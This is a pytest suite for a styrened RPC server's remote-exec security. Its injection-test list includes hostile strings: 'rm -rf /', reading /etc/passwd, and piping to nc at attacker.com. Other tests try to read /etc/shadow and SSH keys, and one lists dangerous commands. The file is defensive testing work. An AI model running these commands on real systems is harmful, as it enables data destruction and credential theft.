"""Tests for RPC server security and functionality.

These tests verify:
- Command whitelist enforcement (security critical)
- Authorization checks
- Shell injection prevention
- Path traversal prevention
- Error handling for malformed requests
- Timeout behavior
"""

import asyncio
import time
from unittest.mock import Mock, patch

import pytest

from styrened.rpc.messages import (
    ExecCommand,
    ExecResult,
    RebootCommand,
    StatusRequest,
    UpdateConfigCommand,
)
from styrened.services.lxmf_service import MockLXMFService
from styrened.rpc import RPCServer
from styrened.rpc.server import DEFAULT_ALLOWED_COMMANDS


@pytest.fixture
def mock_lxmf():
    """Create mock LXMF service."""
    return MockLXMFService()


@pytest.fixture
def rpc_server(mock_lxmf):
    """Create RPC server with mock LXMF service."""
    return RPCServer(mock_lxmf)


@pytest.fixture
def started_rpc_server(rpc_server):
    """Create and start RPC server."""
    rpc_server.start()
    yield rpc_server
    rpc_server.stop()


# =============================================================================
# Command Whitelist Tests (Security Critical)
# =============================================================================


class TestCommandWhitelist:
    """Test command whitelist enforcement to prevent arbitrary code execution."""

    def test_whitelisted_commands_execute(self, started_rpc_server):
        """Test that whitelisted commands are executed."""
        # systemctl is in the whitelist
        cmd = ExecCommand(command="systemctl", args=["status", "reticulum"])

        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="Active", stderr="")

            result = started_rpc_server._handle_exec_command(cmd)

            assert isinstance(result, ExecResult)
            assert result.exit_code == 0
            mock_run.assert_called_once()

    def test_non_whitelisted_commands_rejected(self, started_rpc_server):
        """Test that non-whitelisted commands are rejected.

        Attack vector: Direct execution of dangerous commands (rm, dd, mkfs, etc.)
        """
        # rm is NOT in the whitelist (dangerous command)
        cmd = ExecCommand(command="rm", args=["-rf", "/"])

        result = started_rpc_server._handle_exec_command(cmd)

        assert isinstance(result, ExecResult)
        assert result.exit_code == 126  # Command not allowed
        assert "not allowed" in result.stderr.lower()

    def test_whitelist_case_sensitive(self, started_rpc_server):
        """Test that whitelist is case-sensitive (no bypass via case variation).

        Attack vector: Case bypass - attempting "DF" when only "df" is whitelisted
        """
        # "df" is whitelisted but "DF" should not be
        cmd = ExecCommand(command="DF", args=[])
        result = started_rpc_server._handle_exec_command(cmd)

        assert result.exit_code == 126
        assert "not allowed" in result.stderr.lower()

    def test_shell_injection_attempts_blocked(self, started_rpc_server):
        """Test that shell injection attempts via command are blocked."""
        # Try to inject shell commands
        malicious_commands = [
            "systemctl; rm -rf /",
            "systemctl && cat /etc/passwd",
            "systemctl | nc attacker.com 1234",
            "$(whoami)",
            "`whoami`",
            "systemctl\nrm -rf /",
        ]

        for malicious_cmd in malicious_commands:
            cmd = ExecCommand(command=malicious_cmd, args=[])
            result = started_rpc_server._handle_exec_command(cmd)

            # Should be blocked (not in whitelist)
            assert result.exit_code == 126
            assert "not allowed" in result.stderr.lower()

    def test_path_traversal_attempts_blocked(self, started_rpc_server):
        """Test that path traversal attempts in args are handled safely."""
        # Even if cat is whitelisted, path traversal args should work safely
        # because we pass args as list to subprocess (not shell=True)
        cmd = ExecCommand(command="cat", args=["../../etc/passwd"])

        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            # Simulate file not found (path traversal blocked by filesystem)
            mock_run.return_value = Mock(
                returncode=1, stdout="", stderr="No such file or directory"
            )

            result = started_rpc_server._handle_exec_command(cmd)

            # Command executes but fails safely (subprocess handles it)
            # The key is we're NOT using shell=True, so no shell expansion
            mock_run.assert_called_once()
            call_args = mock_run.call_args
            assert call_args.kwargs.get("shell", False) is False

    def test_custom_whitelist_overrides_default(self, mock_lxmf):
        """Test that custom allowed_commands overrides default."""
        custom_commands = {"echo", "date"}
        server = RPCServer(mock_lxmf, allowed_commands=custom_commands)

        # echo should be allowed (in custom list)
        cmd_allowed = ExecCommand(command="echo", args=["test"])
        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="test\n", stderr="")
            result = server._handle_exec_command(cmd_allowed)
            assert result.exit_code == 0

        # systemctl should be blocked (not in custom list)
        cmd_blocked = ExecCommand(command="systemctl", args=["status"])
        result = server._handle_exec_command(cmd_blocked)
        assert result.exit_code == 126


# =============================================================================
# Shell Injection Prevention Tests (Comprehensive Attack Vector Coverage)
# =============================================================================


class TestShellInjectionPrevention:
    """Test prevention of shell injection attacks via command arguments.

    These tests verify that malicious shell metacharacters in args are NOT
    interpreted as shell commands, even for whitelisted commands.
    """

    def test_shell_injection_pipe_rejected(self, started_rpc_server):
        """Test that pipe operators in args don't cause command chaining.

        Attack vector: df | cat /etc/passwd
        Expected: Pipe character passed as literal arg to df (safe with shell=False)
        """
        cmd = ExecCommand(command="df", args=["|", "cat", "/etc/passwd"])

        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            # Subprocess with shell=False treats these as literal args
            mock_run.return_value = Mock(returncode=1, stdout="", stderr="invalid option")

            result = started_rpc_server._handle_exec_command(cmd)

            # Verify shell=False (safe mode)
            call_args = mock_run.call_args
            assert call_args.kwargs.get("shell", False) is False
            # Command runs but fails because df doesn't recognize "|" as option
            assert result.exit_code == 1

    def test_shell_injection_command_substitution_rejected(self, started_rpc_server):
        """Test that command substitution syntax is NOT executed.

        Attack vectors:
        - echo $(whoami)
        - echo `whoami`

        Expected: Literal strings passed to echo (not executed)
        """
        # POSIX $() syntax
        cmd1 = ExecCommand(command="echo", args=["$(whoami)"])
        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="$(whoami)\n", stderr="")
            result = started_rpc_server._handle_exec_command(cmd1)

            # Verify shell=False
            assert mock_run.call_args.kwargs.get("shell", False) is False
            # Output should be literal string, not actual username
            assert result.stdout == "$(whoami)\n"

        # Backtick syntax
        cmd2 = ExecCommand(command="echo", args=["`whoami`"])
        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="`whoami`\n", stderr="")
            result = started_rpc_server._handle_exec_command(cmd2)

            assert mock_run.call_args.kwargs.get("shell", False) is False
            assert result.stdout == "`whoami`\n"

    def test_shell_injection_semicolon_chaining_rejected(self, started_rpc_server):
        """Test that semicolon command chaining is prevented.

        Attack vector: df; sh
        Expected: Semicolon passed as literal arg (safe with shell=False)
        """
        cmd = ExecCommand(command="df", args=[";", "sh"])

        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=1, stdout="", stderr="invalid option")

            result = started_rpc_server._handle_exec_command(cmd)

            # Verify shell=False
            assert mock_run.call_args.kwargs.get("shell", False) is False
            # df receives ";" as a literal arg and fails
            assert result.exit_code == 1

    def test_shell_injection_and_chaining_rejected(self, started_rpc_server):
        """Test that AND operator command chaining is prevented.

        Attack vector: df && sh
        Expected: && passed as literal args (safe with shell=False)
        """
        cmd = ExecCommand(command="df", args=["&&", "sh"])

        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=1, stdout="", stderr="invalid option")

            result = started_rpc_server._handle_exec_command(cmd)

            assert mock_run.call_args.kwargs.get("shell", False) is False
            assert result.exit_code == 1

    def test_shell_injection_or_chaining_rejected(self, started_rpc_server):
        """Test that OR operator command chaining is prevented.

        Attack vector: df || sh
        Expected: || passed as literal args (safe with shell=False)
        """
        cmd = ExecCommand(command="df", args=["||", "sh"])

        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=1, stdout="", stderr="invalid option")

            result = started_rpc_server._handle_exec_command(cmd)

            assert mock_run.call_args.kwargs.get("shell", False) is False
            assert result.exit_code == 1

    def test_shell_injection_background_execution_rejected(self, started_rpc_server):
        """Test that background execution operator is prevented.

        Attack vector: df &
        Expected: & passed as literal arg (safe with shell=False)
        """
        cmd = ExecCommand(command="df", args=["&"])

        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=1, stdout="", stderr="invalid option")

            result = started_rpc_server._handle_exec_command(cmd)

            assert mock_run.call_args.kwargs.get("shell", False) is False
            assert result.exit_code == 1

    def test_shell_injection_redirection_rejected(self, started_rpc_server):
        """Test that redirection operators are prevented.

        Attack vector: df > /tmp/evil
        Expected: > and /tmp/evil passed as literal args (safe with shell=False)
        """
        cmd = ExecCommand(command="df", args=[">", "/tmp/evil"])

        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=1, stdout="", stderr="invalid option")

            result = started_rpc_server._handle_exec_command(cmd)

            assert mock_run.call_args.kwargs.get("shell", False) is False
            assert result.exit_code == 1


# =============================================================================
# Path Traversal and Whitelist Bypass Tests
# =============================================================================


class TestPathTraversalPrevention:
    """Test prevention of path traversal and whitelist bypass attacks."""

    def test_path_traversal_relative_rejected(self, started_rpc_server):
        """Test that relative path traversal in command name is rejected.

        Attack vector: ../../bin/sh
        Expected: Not in whitelist, rejected
        """
        cmd = ExecCommand(command="../../bin/sh", args=[])
        result = started_rpc_server._handle_exec_command(cmd)

        assert result.exit_code == 126
        assert "not allowed" in result.stderr.lower()

    def test_path_traversal_absolute_rejected(self, started_rpc_server):
        """Test that absolute path in command name is rejected.

        Attack vector: /bin/sh
        Expected: Not in whitelist, rejected
        """
        cmd = ExecCommand(command="/bin/sh", args=[])
        result = started_rpc_server._handle_exec_command(cmd)

        assert result.exit_code == 126
        assert "not allowed" in result.stderr.lower()

    def test_whitespace_bypass_rejected(self, started_rpc_server):
        """Test that whitespace padding doesn't bypass whitelist.

        Attack vector: " df " (with leading/trailing spaces)
        Expected: Rejected (exact match required)
        """
        cmd = ExecCommand(command=" df ", args=[])
        result = started_rpc_server._handle_exec_command(cmd)

        assert result.exit_code == 126
        assert "not allowed" in result.stderr.lower()

    def test_unicode_normalization_bypass_rejected(self, started_rpc_server):
        """Test that Unicode fullwidth characters don't bypass whitelist.

        Attack vector: Fullwidth 'd' (U+FF44) instead of ASCII 'd'
        Expected: Rejected (not in whitelist)
        """
        # Fullwidth 'df' (ｄｆ)
        cmd = ExecCommand(command="\uff44\uff46", args=[])
        result = started_rpc_server._handle_exec_command(cmd)

        assert result.exit_code == 126
        assert "not allowed" in result.stderr.lower()

    def test_null_byte_injection_rejected(self, started_rpc_server):
        """Test that null byte injection in command name is rejected.

        Attack vector: df\x00sh (attempting to terminate string early)
        Expected: Rejected (not exact match in whitelist)
        """
        cmd = ExecCommand(command="df\x00sh", args=[])
        result = started_rpc_server._handle_exec_command(cmd)

        assert result.exit_code == 126
        assert "not allowed" in result.stderr.lower()


# =============================================================================
# Authorization Tests
# =============================================================================


class TestAuthorization:
    """Test authorization and access control."""

    def test_authorized_identity_can_execute(self, started_rpc_server, mock_lxmf):
        """Test that messages from any source can execute (no auth yet)."""
        # Currently no authorization - all sources accepted
        source_hash = "authorized_device_hash"
        request_payload = {
            "protocol": "rpc",
            "type": "status_request",
            "request_id": "test-request-1",
        }

        # Simulate incoming message
        started_rpc_server._handle_incoming_message(source_hash, request_payload)

        # Should have sent response
        assert len(mock_lxmf.sent_messages) == 1
        sent_dest, sent_payload = mock_lxmf.sent_messages[0]
        assert sent_dest == source_hash
        assert sent_payload["type"] == "status_response"

    def test_unauthorized_identity_rejected(self, started_rpc_server, mock_lxmf):
        """Test that unauthorized identities are rejected (future feature).

        Attack vector: Forged identity - attacker sends RPC from unauthorized hash
        Current state: NO AUTHORIZATION IMPLEMENTED (critical security gap!)
        Future state: Should reject non-operator identities
        """
        # Currently no authorization implemented - placeholder test
        # When authorization is added, this test should verify rejection

        # For now, verify that the server accepts all sources
        source_hash = "unauthorized_device_hash"
        request_payload = {
            "protocol": "rpc",
            "type": "status_request",
            "request_id": "test-request-1",
        }

        started_rpc_server._handle_incoming_message(source_hash, request_payload)

        # Currently accepts all - when auth is added, this should be rejected
        assert len(mock_lxmf.sent_messages) == 1

    def test_missing_source_hash_rejected(self, started_rpc_server, mock_lxmf):
        """Test that messages without source_hash are rejected.

        Attack vector: Missing identity - RPC without valid source
        Expected: Eventually should reject (not currently implemented)
        """
        # Empty source hash
        request_payload = {
            "protocol": "rpc",
            "type": "status_request",
            "request_id": "test-request-1",
        }

        started_rpc_server._handle_incoming_message("", request_payload)

        # Should still process (source_hash validation not yet implemented)
        # When implemented, this should reject empty source

    def test_replay_attack_not_prevented(self, started_rpc_server, mock_lxmf):
        """Test that replay attacks are NOT currently prevented (documents gap).

        Attack vector: Replay attack - same RPC message sent twice
        Current state: NO REPLAY PROTECTION (security gap!)
        Future state: Should track request_ids and reject duplicates
        """
        source_hash = "test_device"
        request_payload = {
            "protocol": "rpc",
            "type": "status_request",
            "request_id": "replay-test-1",
        }

        # Send same message twice
        started_rpc_server._handle_incoming_message(source_hash, request_payload)
        started_rpc_server._handle_incoming_message(source_hash, request_payload)

        # Currently both are processed (no replay protection)
        assert len(mock_lxmf.sent_messages) == 2

        # When replay protection is added, second message should be rejected
        # and only 1 response should be sent


# =============================================================================
# Data Exfiltration Prevention Tests
# =============================================================================


class TestDataExfiltrationPrevention:
    """Test prevention of data exfiltration via whitelisted commands.

    CRITICAL: The whitelist includes cat, env, and ps which can exfiltrate data.
    These tests document the CURRENT RISK and verify expected behavior.
    """

    def test_cat_sensitive_files_currently_allowed(self, started_rpc_server):
        """Test that cat can currently read sensitive files (SECURITY GAP!).

        Attack vectors:
        - cat /etc/shadow
        - cat ~/.ssh/id_rsa

        Current state: cat is whitelisted, NO path-based access control
        Future state: Should implement path whitelist for cat (only /var/log/*, etc.)
        """
        # Attempt to read /etc/shadow
        cmd = ExecCommand(command="cat", args=["/etc/shadow"])

        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            # Simulate permission denied (best case) or actual content (worst case)
            mock_run.return_value = Mock(
                returncode=0,
                stdout="root:$6$encrypted_hash...:19000:0:99999:7:::",
                stderr="",
            )

            result = started_rpc_server._handle_exec_command(cmd)

            # SECURITY GAP: Command is executed because cat is whitelisted!
            mock_run.assert_called_once()
            # This documents the risk - cat can read ANY file the daemon has access to

    def test_env_variables_currently_exposed(self, started_rpc_server):
        """Test that env exposes environment variables (SECURITY GAP!).

        Attack vector: env (exposes API keys, tokens, secrets in environment)
        Current state: env is whitelisted, NO filtering
        Future state: Should filter sensitive vars or remove env from whitelist
        """
        cmd = ExecCommand(command="env", args=[])

        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            # Simulate env output with sensitive data
            mock_run.return_value = Mock(
                returncode=0,
                stdout="API_KEY=secret123\nTOKEN=bearer_xyz\nPATH=/usr/bin",
                stderr="",
            )

            result = started_rpc_server._handle_exec_command(cmd)

            # SECURITY GAP: Secrets exposed!
            mock_run.assert_called_once()
            assert "API_KEY=secret123" in result.stdout

    def test_ps_shows_all_processes_currently_allowed(self, started_rpc_server):
        """Test that ps shows all users' processes (SECURITY GAP!).

        Attack vector: ps aux (shows all users' processes and command lines)
        Current state: ps is whitelisted, NO filtering
        Future state: Should restrict ps args or filter output
        """
        cmd = ExecCommand(command="ps", args=["aux"])

        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            # Simulate ps aux showing other users
            mock_run.return_value = Mock(
                returncode=0,
                stdout="root 1234 /bin/secret-daemon --token=xyz\nuser 5678 bash",
                stderr="",
            )

            result = started_rpc_server._handle_exec_command(cmd)

            # SECURITY GAP: All processes visible!
            mock_run.assert_called_once()
            assert "root 1234" in result.stdout

    def test_path_based_access_control_not_implemented(self, started_rpc_server):
        """Test that path-based access control is NOT implemented (documents gap).

        Expected future behavior:
        - cat should only read from /var/log/*, /tmp/styrene/*
        - cat /etc/shadow should be REJECTED at validation layer
        - cat ~/.ssh/id_rsa should be REJECTED

        Current behavior: No path validation, relies on OS permissions
        """
        # This test documents that the feature doesn't exist yet
        # When implemented, add assertions here for path validation


# =============================================================================
# Resource Exhaustion Prevention Tests
# =============================================================================


class TestResourceExhaustionPrevention:
    """Test prevention of resource exhaustion attacks."""

    def test_long_running_command_timeout(self, started_rpc_server):
        """Test that long-running commands timeout after 30 seconds.

        Attack vector: sleep 9999 (blocks server indefinitely)
        Expected: Timeout after 30s (IMPLEMENTED - GOOD!)
        """
        # sleep is not in default whitelist, but test timeout mechanism
        server_with_sleep = RPCServer(
            MockLXMFService(), allowed_commands={"sleep"}
        )
        cmd = ExecCommand(command="sleep", args=["9999"])

        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            import subprocess
            mock_run.side_effect = subprocess.TimeoutExpired(cmd="sleep", timeout=30)

            result = server_with_sleep._handle_exec_command(cmd)

            assert result.exit_code == 124  # Timeout exit code
            assert "timed out" in result.stderr.lower()

    def test_large_output_handled_safely(self, started_rpc_server):
        """Test that commands with large output are handled safely.

        Attack vector: cat /dev/zero (infinite output)
        Expected: Timeout OR output captured but truncated
        """
        cmd = ExecCommand(command="cat", args=["/dev/zero"])

        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            import subprocess
            # Simulate timeout on huge output
            mock_run.side_effect = subprocess.TimeoutExpired(cmd="cat", timeout=30)

            result = started_rpc_server._handle_exec_command(cmd)

            assert result.exit_code == 124
            assert "timed out" in result.stderr.lower()

    def test_fork_bomb_args_handled(self, started_rpc_server):
        """Test that massive argument lists are handled.

        Attack vector: echo with 1,000,000 args (memory exhaustion)
        Expected: Either rejected OR handled by subprocess limits
        """
        # Create 10,000 args (reduced from 1M for test speed)
        massive_args = ["x"] * 10000
        cmd = ExecCommand(command="echo", args=massive_args)

        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            # Simulate successful execution (subprocess handles large args)
            mock_run.return_value = Mock(
                returncode=0,
                stdout=" ".join(massive_args) + "\n",
                stderr="",
            )

            result = started_rpc_server._handle_exec_command(cmd)

            # Should complete (subprocess handles it)
            assert result.exit_code == 0
            mock_run.assert_called_once()

    def test_concurrent_requests_not_rate_limited(self, started_rpc_server, mock_lxmf):
        """Test that concurrent requests are NOT rate limited (documents gap).

        Attack vector: 1000 simultaneous RPC requests (DoS)
        Current state: NO RATE LIMITING (security gap!)
        Future state: Should queue or rate limit requests
        """
        # This test documents the lack of rate limiting
        # Currently, all requests would be processed concurrently
        # When rate limiting is added, verify queue depth or rejection


# =============================================================================
# Error Handling Tests
# =============================================================================


class TestErrorHandling:
    """Test error handling for various failure scenarios."""

    def test_command_execution_errors_reported(self, started_rpc_server):
        """Test that command execution errors are reported correctly."""
        cmd = ExecCommand(command="systemctl", args=["invalid-command"])

        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            # Simulate command failure
            mock_run.return_value = Mock(
                returncode=1, stdout="", stderr="Unknown operation"
            )

            result = started_rpc_server._handle_exec_command(cmd)

            assert result.exit_code == 1
            assert "Unknown operation" in result.stderr

    def test_malformed_rpc_messages_handled(self, started_rpc_server, mock_lxmf):
        """Test that malformed RPC messages are handled gracefully."""
        source_hash = "test_device"

        # Missing request_id
        malformed_payload = {"protocol": "rpc", "type": "status_request"}

        started_rpc_server._handle_incoming_message(source_hash, malformed_payload)

        # Should log warning and not send response (request_id required)
        assert len(mock_lxmf.sent_messages) == 0

    def test_timeout_on_long_running_commands(self, started_rpc_server):
        """Test that long-running commands timeout appropriately."""
        # Use a whitelisted command to test timeout behavior
        cmd = ExecCommand(command="systemctl", args=["status", "longrunning"])

        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            # Simulate timeout
            import subprocess

            mock_run.side_effect = subprocess.TimeoutExpired(cmd="systemctl", timeout=30)

            result = started_rpc_server._handle_exec_command(cmd)

            assert result.exit_code == 124  # Timeout exit code
            assert "timed out" in result.stderr.lower()

    def test_command_not_found_handled(self, started_rpc_server):
        """Test that FileNotFoundError is handled for missing commands."""
        # Use a whitelisted command that doesn't exist
        server_with_fake = RPCServer(
            MockLXMFService(), allowed_commands={"nonexistent_command"}
        )
        cmd = ExecCommand(command="nonexistent_command", args=[])

        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.side_effect = FileNotFoundError()

            result = server_with_fake._handle_exec_command(cmd)

            assert result.exit_code == 127  # Command not found
            assert "not found" in result.stderr.lower()

    def test_general_exception_handled(self, started_rpc_server):
        """Test that general exceptions during exec are handled."""
        cmd = ExecCommand(command="echo", args=["test"])

        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.side_effect = Exception("Unexpected error")

            result = started_rpc_server._handle_exec_command(cmd)

            assert result.exit_code == 1
            assert "Unexpected error" in result.stderr

    def test_invalid_message_type_handled(self, started_rpc_server, mock_lxmf):
        """Test that invalid message types trigger error response."""
        source_hash = "test_device"
        request_payload = {
            "protocol": "rpc",
            "type": "invalid_type",
            "request_id": "test-request-1",
        }

        started_rpc_server._handle_incoming_message(source_hash, request_payload)

        # Should send error response
        assert len(mock_lxmf.sent_messages) == 1
        sent_dest, sent_payload = mock_lxmf.sent_messages[0]
        assert sent_payload["type"] == "error"

    def test_deserialization_error_handled(self, started_rpc_server, mock_lxmf):
        """Test that deserialization errors are handled."""
        source_hash = "test_device"
        # Malformed status_request (missing required fields)
        request_payload = {
            "protocol": "rpc",
            "type": "exec",
            "request_id": "test-request-1",
            # Missing 'command' and 'args'
        }

        started_rpc_server._handle_incoming_message(source_hash, request_payload)

        # Should send error response
        assert len(mock_lxmf.sent_messages) == 1
        sent_dest, sent_payload = mock_lxmf.sent_messages[0]
        assert sent_payload["type"] == "error"


# =============================================================================
# Status Request Tests
# =============================================================================


class TestStatusRequest:
    """Test status request handling."""

    def test_status_request_returns_system_info(self, started_rpc_server):
        """Test that status request gathers and returns system info."""
        with (
            patch.object(
                started_rpc_server, "_get_uptime", return_value=12345
            ) as mock_uptime,
            patch.object(
                started_rpc_server, "_get_ip_address", return_value="192.168.1.100"
            ) as mock_ip,
            patch.object(
                started_rpc_server,
                "_get_services",
                return_value=["reticulum", "lxmd"],
            ) as mock_services,
            patch.object(
                started_rpc_server,
                "_get_disk_usage",
                return_value=(4000000000, 10000000000),
            ) as mock_disk,
        ):
            result = started_rpc_server._handle_status_request()

            assert result.uptime == 12345
            assert result.ip == "192.168.1.100"
            assert result.services == ["reticulum", "lxmd"]
            assert result.disk_used == 4000000000
            assert result.disk_total == 10000000000

    def test_status_request_end_to_end(self, started_rpc_server, mock_lxmf):
        """Test complete status request flow."""
        source_hash = "test_device"
        request_payload = {
            "protocol": "rpc",
            "type": "status_request",
            "request_id": "test-request-1",
        }

        with (
            patch.object(started_rpc_server, "_get_uptime", return_value=100),
            patch.object(
                started_rpc_server, "_get_ip_address", return_value="192.168.1.1"
            ),
            patch.object(started_rpc_server, "_get_services", return_value=["rns"]),
            patch.object(
                started_rpc_server, "_get_disk_usage", return_value=(1000, 10000)
            ),
        ):
            started_rpc_server._handle_incoming_message(source_hash, request_payload)

            # Verify response sent
            assert len(mock_lxmf.sent_messages) == 1
            sent_dest, sent_payload = mock_lxmf.sent_messages[0]
            assert sent_dest == source_hash
            assert sent_payload["type"] == "status_response"
            assert sent_payload["uptime"] == 100
            assert sent_payload["ip"] == "192.168.1.1"


# =============================================================================
# Reboot Command Tests
# =============================================================================


class TestRebootCommand:
    """Test reboot command handling."""

    @pytest.mark.asyncio
    async def test_reboot_with_delay_schedules_correctly(self, started_rpc_server):
        """Test that reboot with delay schedules the reboot."""
        cmd = RebootCommand(delay=60)

        with patch("styrened.rpc.server.asyncio.get_event_loop") as mock_loop:
            mock_event_loop = Mock()
            mock_loop.return_value = mock_event_loop

            result = started_rpc_server._handle_reboot_command(cmd)

            assert result.success is True
            assert "scheduled" in result.message.lower()
            # Verify reboot was scheduled
            mock_event_loop.call_later.assert_called_once()

    @pytest.mark.asyncio
    async def test_immediate_reboot_has_safety_delay(self, started_rpc_server):
        """Test that immediate reboot still has 5 second safety delay."""
        cmd = RebootCommand(delay=0)

        with patch("styrened.rpc.server.asyncio.get_event_loop") as mock_loop:
            mock_event_loop = Mock()
            mock_loop.return_value = mock_event_loop

            result = started_rpc_server._handle_reboot_command(cmd)

            assert result.success is True
            # Should schedule for 5 seconds (safety delay)
            call_args = mock_event_loop.call_later.call_args
            assert call_args[0][0] == 5


# =============================================================================
# Update Config Command Tests
# =============================================================================


class TestUpdateConfigCommand:
    """Test update config command handling."""

    def test_update_config_acknowledges_changes(self, started_rpc_server):
        """Test that update_config acknowledges config changes."""
        cmd = UpdateConfigCommand(
            config_updates={"log_level": "DEBUG", "max_retries": 5}
        )

        result = started_rpc_server._handle_update_config_command(cmd)

        assert result.success is True
        assert len(result.updated_keys) == 2
        assert "log_level" in result.updated_keys
        assert "max_retries" in result.updated_keys


# =============================================================================
# Server Lifecycle Tests
# =============================================================================


class TestServerLifecycle:
    """Test server start/stop behavior."""

    def test_server_starts_successfully(self, rpc_server, mock_lxmf):
        """Test that server starts and registers callback."""
        rpc_server.start()

        assert rpc_server._running is True
        # Should have registered callback with LXMF
        assert mock_lxmf._callback is not None

    def test_server_stops_successfully(self, started_rpc_server):
        """Test that server stops cleanly."""
        started_rpc_server.stop()

        assert started_rpc_server._running is False

    def test_multiple_start_calls_handled(self, rpc_server):
        """Test that multiple start calls don't cause issues."""
        rpc_server.start()
        rpc_server.start()  # Second start

        assert rpc_server._running is True

    def test_stopped_server_ignores_messages(self, rpc_server, mock_lxmf):
        """Test that stopped server ignores incoming messages."""
        # Don't start server
        source_hash = "test_device"
        request_payload = {
            "protocol": "rpc",
            "type": "status_request",
            "request_id": "test-request-1",
        }

        rpc_server._handle_incoming_message(source_hash, request_payload)

        # Should not send any response (server not running)
        assert len(mock_lxmf.sent_messages) == 0

    def test_non_rpc_messages_ignored(self, started_rpc_server, mock_lxmf):
        """Test that non-RPC messages are ignored."""
        source_hash = "test_device"
        chat_payload = {
            "protocol": "chat",
            "content": "Hello!",
        }

        started_rpc_server._handle_incoming_message(source_hash, chat_payload)

        # Should not send response (not an RPC message)
        assert len(mock_lxmf.sent_messages) == 0


# =============================================================================
# Default Whitelist Verification
# =============================================================================


class TestDefaultWhitelist:
    """Verify the default command whitelist is sensible."""

    def test_default_whitelist_contains_safe_commands(self):
        """Test that default whitelist contains expected safe commands."""
        # Verify essential safe commands are present
        assert "systemctl" in DEFAULT_ALLOWED_COMMANDS
        assert "journalctl" in DEFAULT_ALLOWED_COMMANDS
        assert "df" in DEFAULT_ALLOWED_COMMANDS
        assert "uptime" in DEFAULT_ALLOWED_COMMANDS
        assert "rnstatus" in DEFAULT_ALLOWED_COMMANDS

    def test_default_whitelist_excludes_dangerous_commands(self):
        """Test that default whitelist excludes dangerous commands."""
        # Verify dangerous commands are NOT present
        dangerous_commands = {
            "rm",
            "dd",
            "mkfs",
            "fdisk",
            "chmod",
            "chown",
            "passwd",
            "useradd",
            "userdel",
            "sudo",
            "su",
            "shutdown",
        }

        for dangerous_cmd in dangerous_commands:
            assert (
                dangerous_cmd not in DEFAULT_ALLOWED_COMMANDS
            ), f"Dangerous command '{dangerous_cmd}' found in whitelist!"

    def test_default_whitelist_is_frozen(self):
        """Test that default whitelist is immutable."""
        # Verify it's a frozenset (immutable)
        assert isinstance(DEFAULT_ALLOWED_COMMANDS, frozenset)
